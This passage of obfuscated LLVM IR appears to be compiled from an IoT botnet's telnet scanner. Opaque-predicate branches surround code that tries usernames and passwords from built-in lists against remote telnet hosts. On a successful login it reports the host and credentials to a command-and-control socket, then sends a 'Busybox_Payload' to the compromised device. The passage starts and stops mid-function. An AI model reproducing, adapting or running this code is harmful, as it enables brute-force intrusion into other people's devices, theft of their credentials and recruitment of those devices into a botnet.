  br i1 %662, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %654
  %663 = load i32, i32* @x.99
  %664 = load i32, i32* @y.100
  %665 = sub i32 %663, 1
  %666 = mul i32 %663, %665
  %667 = urem i32 %666, 2
  %668 = icmp eq i32 %667, 0
  %669 = icmp slt i32 %664, 10
  %670 = or i1 %668, %669
  br i1 %670, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br label %1267

; <label>:671:                                    ; preds = %originalBBpart229
  %672 = load i32, i32* %11, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %673
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %674, i32 0, i32 0
  %676 = load i32, i32* %675, align 8
  %677 = load i32, i32* %11, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 5
  %681 = load i8, i8* %680, align 2
  %682 = zext i8 %681 to i64
  %683 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %682
  %684 = load i8*, i8** %683, align 8
  %685 = load i32, i32* %11, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %686
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %687, i32 0, i32 5
  %689 = load i8, i8* %688, align 2
  %690 = zext i8 %689 to i64
  %691 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %690
  %692 = load i8*, i8** %691, align 8
  %693 = call i64 @strlen(i8* %692) #9
  %694 = call i64 @send(i32 %676, i8* %684, i64 %693, i32 16384)
  %695 = icmp slt i64 %694, 0
  br i1 %695, label %696, label %705

; <label>:696:                                    ; preds = %671
  %697 = load i32, i32* %11, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %698
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %699, i32 0, i32 3
  store i8 0, i8* %700, align 4
  %701 = load i32, i32* %11, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 4
  store i8 1, i8* %704, align 1
  br label %1284

; <label>:705:                                    ; preds = %671
  %706 = load i32, i32* @x.99
  %707 = load i32, i32* @y.100
  %708 = sub i32 %706, 1
  %709 = mul i32 %706, %708
  %710 = urem i32 %709, 2
  %711 = icmp eq i32 %710, 0
  %712 = icmp slt i32 %707, 10
  %713 = or i1 %711, %712
  br i1 %713, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %705
  %714 = load i32, i32* %11, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 0
  %718 = load i32, i32* %717, align 8
  %719 = call i64 @send(i32 %718, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.866, i32 0, i32 0), i64 2, i32 16384)
  %720 = icmp slt i64 %719, 0
  %721 = load i32, i32* @x.99
  %722 = load i32, i32* @y.100
  %723 = sub i32 %721, 1
  %724 = mul i32 %721, %723
  %725 = urem i32 %724, 2
  %726 = icmp eq i32 %725, 0
  %727 = icmp slt i32 %722, 10
  %728 = or i1 %726, %727
  br i1 %728, label %originalBBpart2154, label %originalBB152alteredBB

originalBBpart2154:                               ; preds = %originalBB152
  br i1 %720, label %729, label %738

; <label>:729:                                    ; preds = %originalBBpart2154
  %730 = load i32, i32* %11, align 4
  %731 = sext i32 %730 to i64
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %731
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %732, i32 0, i32 3
  store i8 0, i8* %733, align 4
  %734 = load i32, i32* %11, align 4
  %735 = sext i32 %734 to i64
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %735
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %736, i32 0, i32 4
  store i8 1, i8* %737, align 1
  br label %1284

; <label>:738:                                    ; preds = %originalBBpart2154
  %739 = load i32, i32* %11, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %740
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %741, i32 0, i32 3
  store i8 4, i8* %742, align 4
  br label %1267

; <label>:743:                                    ; preds = %originalBBpart229
  %744 = load i32, i32* @x.99
  %745 = load i32, i32* @y.100
  %746 = sub i32 %744, 1
  %747 = mul i32 %744, %746
  %748 = urem i32 %747, 2
  %749 = icmp eq i32 %748, 0
  %750 = icmp slt i32 %745, 10
  %751 = or i1 %749, %750
  br i1 %751, label %originalBB156, label %originalBB156alteredBB

originalBB156:                                    ; preds = %originalBB156alteredBB, %743
  %752 = load i32, i32* %11, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 0
  %756 = load i32, i32* %755, align 8
  %757 = load i32, i32* %11, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 11
  %761 = load i8*, i8** %760, align 8
  %762 = call i32 @read_until_response(i32 %756, i32 10000, i8* %761, i32 256, i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @advances, i32 0, i32 0))
  %763 = icmp ne i32 %762, 0
  %764 = load i32, i32* @x.99
  %765 = load i32, i32* @y.100
  %766 = sub i32 %764, 1
  %767 = mul i32 %764, %766
  %768 = urem i32 %767, 2
  %769 = icmp eq i32 %768, 0
  %770 = icmp slt i32 %765, 10
  %771 = or i1 %769, %770
  br i1 %771, label %originalBBpart2158, label %originalBB156alteredBB

originalBBpart2158:                               ; preds = %originalBB156
  br i1 %763, label %772, label %807

; <label>:772:                                    ; preds = %originalBBpart2158
  %773 = load i32, i32* %11, align 4
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %774
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %775, i32 0, i32 11
  %777 = load i8*, i8** %776, align 8
  %778 = call i32 @contains_fail(i8* %777)
  %779 = icmp ne i32 %778, 0
  br i1 %779, label %780, label %785

; <label>:780:                                    ; preds = %772
  %781 = load i32, i32* %11, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %782
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 3
  store i8 0, i8* %784, align 4
  br label %806

; <label>:785:                                    ; preds = %772
  %786 = load i32, i32* @x.99
  %787 = load i32, i32* @y.100
  %788 = sub i32 %786, 1
  %789 = mul i32 %786, %788
  %790 = urem i32 %789, 2
  %791 = icmp eq i32 %790, 0
  %792 = icmp slt i32 %787, 10
  %793 = or i1 %791, %792
  br i1 %793, label %originalBB160, label %originalBB160alteredBB

originalBB160:                                    ; preds = %originalBB160alteredBB, %785
  %794 = load i32, i32* %11, align 4
  %795 = sext i32 %794 to i64
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %795
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %796, i32 0, i32 3
  store i8 5, i8* %797, align 4
  %798 = load i32, i32* @x.99
  %799 = load i32, i32* @y.100
  %800 = sub i32 %798, 1
  %801 = mul i32 %798, %800
  %802 = urem i32 %801, 2
  %803 = icmp eq i32 %802, 0
  %804 = icmp slt i32 %799, 10
  %805 = or i1 %803, %804
  br i1 %805, label %originalBBpart2162, label %originalBB160alteredBB

originalBBpart2162:                               ; preds = %originalBB160
  br label %806

; <label>:806:                                    ; preds = %originalBBpart2162, %780
  br label %1284

; <label>:807:                                    ; preds = %originalBBpart2158
  %808 = load i32, i32* %11, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 9
  %812 = load i32, i32* %811, align 8
  %813 = add i32 %812, 6
  %814 = zext i32 %813 to i64
  %815 = call i64 @time(i64* null) #5
  %816 = icmp slt i64 %814, %815
  br i1 %816, label %817, label %842

; <label>:817:                                    ; preds = %807
  %818 = load i32, i32* @x.99
  %819 = load i32, i32* @y.100
  %820 = sub i32 %818, 1
  %821 = mul i32 %818, %820
  %822 = urem i32 %821, 2
  %823 = icmp eq i32 %822, 0
  %824 = icmp slt i32 %819, 10
  %825 = or i1 %823, %824
  br i1 %825, label %originalBB164, label %originalBB164alteredBB

originalBB164:                                    ; preds = %originalBB164alteredBB, %817
  %826 = load i32, i32* %11, align 4
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %827
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %828, i32 0, i32 3
  store i8 0, i8* %829, align 4
  %830 = load i32, i32* %11, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 4
  store i8 1, i8* %833, align 1
  %834 = load i32, i32* @x.99
  %835 = load i32, i32* @y.100
  %836 = sub i32 %834, 1
  %837 = mul i32 %834, %836
  %838 = urem i32 %837, 2
  %839 = icmp eq i32 %838, 0
  %840 = icmp slt i32 %835, 10
  %841 = or i1 %839, %840
  br i1 %841, label %originalBBpart2166, label %originalBB164alteredBB

originalBBpart2166:                               ; preds = %originalBB164
  br label %842

; <label>:842:                                    ; preds = %originalBBpart2166, %807
  %843 = load i32, i32* @x.99
  %844 = load i32, i32* @y.100
  %845 = sub i32 %843, 1
  %846 = mul i32 %843, %845
  %847 = urem i32 %846, 2
  %848 = icmp eq i32 %847, 0
  %849 = icmp slt i32 %844, 10
  %850 = or i1 %848, %849
  br i1 %850, label %originalBB168, label %originalBB168alteredBB

originalBB168:                                    ; preds = %originalBB168alteredBB, %842
  %851 = load i32, i32* @x.99
  %852 = load i32, i32* @y.100
  %853 = sub i32 %851, 1
  %854 = mul i32 %851, %853
  %855 = urem i32 %854, 2
  %856 = icmp eq i32 %855, 0
  %857 = icmp slt i32 %852, 10
  %858 = or i1 %856, %857
  br i1 %858, label %originalBBpart2170, label %originalBB168alteredBB

originalBBpart2170:                               ; preds = %originalBB168
  br label %1267

; <label>:859:                                    ; preds = %originalBBpart229
  %860 = load i32, i32* %11, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %861
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %862, i32 0, i32 0
  %864 = load i32, i32* %863, align 8
  %865 = load i32, i32* %11, align 4
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %866
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %867, i32 0, i32 6
  %869 = load i8, i8* %868, align 1
  %870 = zext i8 %869 to i64
  %871 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %870
  %872 = load i8*, i8** %871, align 8
  %873 = load i32, i32* %11, align 4
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %874
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %875, i32 0, i32 6
  %877 = load i8, i8* %876, align 1
  %878 = zext i8 %877 to i64
  %879 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %878
  %880 = load i8*, i8** %879, align 8
  %881 = call i64 @strlen(i8* %880) #9
  %882 = call i64 @send(i32 %864, i8* %872, i64 %881, i32 16384)
  %883 = icmp slt i64 %882, 0
  br i1 %883, label %884, label %909

; <label>:884:                                    ; preds = %859
  %885 = load i32, i32* @x.99
  %886 = load i32, i32* @y.100
  %887 = sub i32 %885, 1
  %888 = mul i32 %885, %887
  %889 = urem i32 %888, 2
  %890 = icmp eq i32 %889, 0
  %891 = icmp slt i32 %886, 10
  %892 = or i1 %890, %891
  br i1 %892, label %originalBB172, label %originalBB172alteredBB

originalBB172:                                    ; preds = %originalBB172alteredBB, %884
  %893 = load i32, i32* %11, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %895, i32 0, i32 3
  store i8 0, i8* %896, align 4
  %897 = load i32, i32* %11, align 4
  %898 = sext i32 %897 to i64
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %898
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %899, i32 0, i32 4
  store i8 1, i8* %900, align 1
  %901 = load i32, i32* @x.99
  %902 = load i32, i32* @y.100
  %903 = sub i32 %901, 1
  %904 = mul i32 %901, %903
  %905 = urem i32 %904, 2
  %906 = icmp eq i32 %905, 0
  %907 = icmp slt i32 %902, 10
  %908 = or i1 %906, %907
  br i1 %908, label %originalBBpart2174, label %originalBB172alteredBB

originalBBpart2174:                               ; preds = %originalBB172
  br label %1284

; <label>:909:                                    ; preds = %859
  %910 = load i32, i32* %11, align 4
  %911 = sext i32 %910 to i64
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %911
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %912, i32 0, i32 0
  %914 = load i32, i32* %913, align 8
  %915 = call i64 @send(i32 %914, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.866, i32 0, i32 0), i64 2, i32 16384)
  %916 = icmp slt i64 %915, 0
  br i1 %916, label %917, label %926

; <label>:917:                                    ; preds = %909
  %918 = load i32, i32* %11, align 4
  %919 = sext i32 %918 to i64
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %919
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %920, i32 0, i32 3
  store i8 0, i8* %921, align 4
  %922 = load i32, i32* %11, align 4
  %923 = sext i32 %922 to i64
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %923
  %925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %924, i32 0, i32 4
  store i8 1, i8* %925, align 1
  br label %1284

; <label>:926:                                    ; preds = %909
  %927 = load i32, i32* @x.99
  %928 = load i32, i32* @y.100
  %929 = sub i32 %927, 1
  %930 = mul i32 %927, %929
  %931 = urem i32 %930, 2
  %932 = icmp eq i32 %931, 0
  %933 = icmp slt i32 %928, 10
  %934 = or i1 %932, %933
  br i1 %934, label %originalBB176, label %originalBB176alteredBB

originalBB176:                                    ; preds = %originalBB176alteredBB, %926
  %935 = load i32, i32* %11, align 4
  %936 = sext i32 %935 to i64
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %936
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %937, i32 0, i32 3
  store i8 6, i8* %938, align 4
  %939 = load i32, i32* @x.99
  %940 = load i32, i32* @y.100
  %941 = sub i32 %939, 1
  %942 = mul i32 %939, %941
  %943 = urem i32 %942, 2
  %944 = icmp eq i32 %943, 0
  %945 = icmp slt i32 %940, 10
  %946 = or i1 %944, %945
  br i1 %946, label %originalBBpart2178, label %originalBB176alteredBB

originalBBpart2178:                               ; preds = %originalBB176
  br label %1267

; <label>:947:                                    ; preds = %originalBBpart229
  %948 = load i32, i32* %11, align 4
  %949 = sext i32 %948 to i64
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %949
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %950, i32 0, i32 0
  %952 = load i32, i32* %951, align 8
  %953 = load i32, i32* %11, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %954
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %955, i32 0, i32 11
  %957 = load i8*, i8** %956, align 8
  %958 = call i32 @read_until_response(i32 %952, i32 10000, i8* %957, i32 256, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %959 = icmp ne i32 %958, 0
  br i1 %959, label %960, label %1061

; <label>:960:                                    ; preds = %947
  %961 = load i32, i32* @x.99
  %962 = load i32, i32* @y.100
  %963 = sub i32 %961, 1
  %964 = mul i32 %961, %963
  %965 = urem i32 %964, 2
  %966 = icmp eq i32 %965, 0
  %967 = icmp slt i32 %962, 10
  %968 = or i1 %966, %967
  br i1 %968, label %originalBB180, label %originalBB180alteredBB

originalBB180:                                    ; preds = %originalBB180alteredBB, %960
  %969 = call i64 @time(i64* null) #5
  %970 = trunc i64 %969 to i32
  %971 = load i32, i32* %11, align 4
  %972 = sext i32 %971 to i64
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %972
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %973, i32 0, i32 9
  store i32 %970, i32* %974, align 8
  %975 = load i32, i32* %11, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %976
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %977, i32 0, i32 11
  %979 = load i8*, i8** %978, align 8
  %980 = call i32 @contains_fail(i8* %979)
  %981 = icmp ne i32 %980, 0
  %982 = load i32, i32* @x.99
  %983 = load i32, i32* @y.100
  %984 = sub i32 %982, 1
  %985 = mul i32 %982, %984
  %986 = urem i32 %985, 2
  %987 = icmp eq i32 %986, 0
  %988 = icmp slt i32 %983, 10
  %989 = or i1 %987, %988
  br i1 %989, label %originalBBpart2182, label %originalBB180alteredBB

originalBBpart2182:                               ; preds = %originalBB180
  br i1 %981, label %990, label %995

; <label>:990:                                    ; preds = %originalBBpart2182
  %991 = load i32, i32* %11, align 4
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %992
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %993, i32 0, i32 3
  store i8 0, i8* %994, align 4
  br label %1044

; <label>:995:                                    ; preds = %originalBBpart2182
  %996 = load i32, i32* @mainCommSock, align 4
  %997 = load i32, i32* %11, align 4
  %998 = sext i32 %997 to i64
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %998
  %1000 = call i8* @get_telstate_host(%struct.telstate_t* %999)
  %1001 = load i32, i32* %11, align 4
  %1002 = sext i32 %1001 to i64
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1002
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1003, i32 0, i32 5
  %1005 = load i8, i8* %1004, align 2
  %1006 = zext i8 %1005 to i64
  %1007 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %1006
  %1008 = load i8*, i8** %1007, align 8
  %1009 = load i32, i32* %11, align 4
  %1010 = sext i32 %1009 to i64
  %1011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1010
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1011, i32 0, i32 6
  %1013 = load i8, i8* %1012, align 1
  %1014 = zext i8 %1013 to i64
  %1015 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %1014
  %1016 = load i8*, i8** %1015, align 8
  %1017 = call i32 (i32, i8*, ...) @sockprintf(i32 %996, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.877, i32 0, i32 0), i8* %1000, i8* %1008, i8* %1016)
  %1018 = load i32, i32* @mainCommSock, align 4
  %1019 = load i32, i32* %11, align 4
  %1020 = sext i32 %1019 to i64
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1020
  %1022 = call i8* @get_telstate_host(%struct.telstate_t* %1021)
  %1023 = load i32, i32* %11, align 4
  %1024 = sext i32 %1023 to i64
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1024
  %1026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1025, i32 0, i32 5
  %1027 = load i8, i8* %1026, align 2
  %1028 = zext i8 %1027 to i64
  %1029 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %1028
  %1030 = load i8*, i8** %1029, align 8
  %1031 = load i32, i32* %11, align 4
  %1032 = sext i32 %1031 to i64
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1032
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1033, i32 0, i32 6
  %1035 = load i8, i8* %1034, align 1
  %1036 = zext i8 %1035 to i64
  %1037 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %1036
  %1038 = load i8*, i8** %1037, align 8
  %1039 = call i32 (i32, i8*, ...) @sockprintf(i32 %1018, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.865, i32 0, i32 0), i8* %1022, i8* %1030, i8* %1038)
  %1040 = load i32, i32* %11, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1041
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1042, i32 0, i32 3
  store i8 7, i8* %1043, align 4
  br label %1044

; <label>:1044:                                   ; preds = %995, %990
  %1045 = load i32, i32* @x.99
  %1046 = load i32, i32* @y.100
  %1047 = sub i32 %1045, 1
  %1048 = mul i32 %1045, %1047
  %1049 = urem i32 %1048, 2
  %1050 = icmp eq i32 %1049, 0
  %1051 = icmp slt i32 %1046, 10
  %1052 = or i1 %1050, %1051
  br i1 %1052, label %originalBB184, label %originalBB184alteredBB

originalBB184:                                    ; preds = %originalBB184alteredBB, %1044
  %1053 = load i32, i32* @x.99
  %1054 = load i32, i32* @y.100
  %1055 = sub i32 %1053, 1
  %1056 = mul i32 %1053, %1055
  %1057 = urem i32 %1056, 2
  %1058 = icmp eq i32 %1057, 0
  %1059 = icmp slt i32 %1054, 10
  %1060 = or i1 %1058, %1059
  br i1 %1060, label %originalBBpart2186, label %originalBB184alteredBB

originalBBpart2186:                               ; preds = %originalBB184
  br label %1284

; <label>:1061:                                   ; preds = %947
  %1062 = load i32, i32* @x.99
  %1063 = load i32, i32* @y.100
  %1064 = sub i32 %1062, 1
  %1065 = mul i32 %1062, %1064
  %1066 = urem i32 %1065, 2
  %1067 = icmp eq i32 %1066, 0
  %1068 = icmp slt i32 %1063, 10
  %1069 = or i1 %1067, %1068
  br i1 %1069, label %originalBB188, label %originalBB188alteredBB

originalBB188:                                    ; preds = %originalBB188alteredBB, %1061
  %1070 = load i32, i32* %11, align 4
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1071
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1072, i32 0, i32 9
  %1074 = load i32, i32* %1073, align 8
  %1075 = add i32 %1074, 6
  %1076 = zext i32 %1075 to i64
  %1077 = call i64 @time(i64* null) #5
  %1078 = icmp slt i64 %1076, %1077
  %1079 = load i32, i32* @x.99
  %1080 = load i32, i32* @y.100
  %1081 = sub i32 %1079, 1
  %1082 = mul i32 %1079, %1081
  %1083 = urem i32 %1082, 2
  %1084 = icmp eq i32 %1083, 0
  %1085 = icmp slt i32 %1080, 10
  %1086 = or i1 %1084, %1085
  br i1 %1086, label %originalBBpart2204, label %originalBB188alteredBB

originalBBpart2204:                               ; preds = %originalBB188
  br i1 %1078, label %1087, label %1096

; <label>:1087:                                   ; preds = %originalBBpart2204
  %1088 = load i32, i32* %11, align 4
  %1089 = sext i32 %1088 to i64
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1089
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1090, i32 0, i32 3
  store i8 0, i8* %1091, align 4
  %1092 = load i32, i32* %11, align 4
  %1093 = sext i32 %1092 to i64
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1093
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1094, i32 0, i32 4
  store i8 1, i8* %1095, align 1
  br label %1096

; <label>:1096:                                   ; preds = %1087, %originalBBpart2204
  %1097 = load i32, i32* @x.99
  %1098 = load i32, i32* @y.100
  %1099 = sub i32 %1097, 1
  %1100 = mul i32 %1097, %1099
  %1101 = urem i32 %1100, 2
  %1102 = icmp eq i32 %1101, 0
  %1103 = icmp slt i32 %1098, 10
  %1104 = or i1 %1102, %1103
  br i1 %1104, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1096
  %1105 = load i32, i32* @x.99
  %1106 = load i32, i32* @y.100
  %1107 = sub i32 %1105, 1
  %1108 = mul i32 %1105, %1107
  %1109 = urem i32 %1108, 2
  %1110 = icmp eq i32 %1109, 0
  %1111 = icmp slt i32 %1106, 10
  %1112 = or i1 %1110, %1111
  br i1 %1112, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br label %1267

; <label>:1113:                                   ; preds = %originalBBpart229
  %1114 = load i32, i32* %11, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1115
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1116, i32 0, i32 0
  %1118 = load i32, i32* %1117, align 8
  %1119 = load i8*, i8** @Busybox_Payload, align 8
  %1120 = load i8*, i8** @Busybox_Payload, align 8
  %1121 = call i64 @strlen(i8* %1120) #9
  %1122 = call i64 @send(i32 %1118, i8* %1119, i64 %1121, i32 16384)
  %1123 = icmp slt i64 %1122, 0
  br i1 %1123, label %1124, label %1149

; <label>:1124:                                   ; preds = %1113
  %1125 = load i32, i32* @x.99
  %1126 = load i32, i32* @y.100
  %1127 = sub i32 %1125, 1
  %1128 = mul i32 %1125, %1127
  %1129 = urem i32 %1128, 2
  %1130 = icmp eq i32 %1129, 0
  %1131 = icmp slt i32 %1126, 10
  %1132 = or i1 %1130, %1131
  br i1 %1132, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1124
  %1133 = load i32, i32* %11, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1134
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1135, i32 0, i32 3
  store i8 0, i8* %1136, align 4
  %1137 = load i32, i32* %11, align 4
  %1138 = sext i32 %1137 to i64
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1138
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1139, i32 0, i32 4
  store i8 1, i8* %1140, align 1
  %1141 = load i32, i32* @x.99
  %1142 = load i32, i32* @y.100
  %1143 = sub i32 %1141, 1
  %1144 = mul i32 %1141, %1143
  %1145 = urem i32 %1144, 2
  %1146 = icmp eq i32 %1145, 0
  %1147 = icmp slt i32 %1142, 10
  %1148 = or i1 %1146, %1147
  br i1 %1148, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br label %1284

; <label>:1149:                                   ; preds = %1113
  %1150 = load i32, i32* @x.99
  %1151 = load i32, i32* @y.100
  %1152 = sub i32 %1150, 1
  %1153 = mul i32 %1150, %1152
  %1154 = urem i32 %1153, 2
  %1155 = icmp eq i32 %1154, 0
  %1156 = icmp slt i32 %1151, 10
  %1157 = or i1 %1155, %1156
  br i1 %1157, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1149
  %1158 = load i32, i32* %11, align 4
  %1159 = sext i32 %1158 to i64
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1159
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1160, i32 0, i32 3
  store i8 8, i8* %1161, align 4
  %1162 = load i32, i32* @x.99
  %1163 = load i32, i32* @y.100
  %1164 = sub i32 %1162, 1
  %1165 = mul i32 %1162, %1164
  %1166 = urem i32 %1165, 2
  %1167 = icmp eq i32 %1166, 0
  %1168 = icmp slt i32 %1163, 10
  %1169 = or i1 %1167, %1168
  br i1 %1169, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br label %1267

; <label>:1170:                                   ; preds = %originalBBpart229
  %1171 = call i64 @time(i64* null) #5
  %1172 = trunc i64 %1171 to i32
  %1173 = load i32, i32* %11, align 4
  %1174 = sext i32 %1173 to i64
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %1174
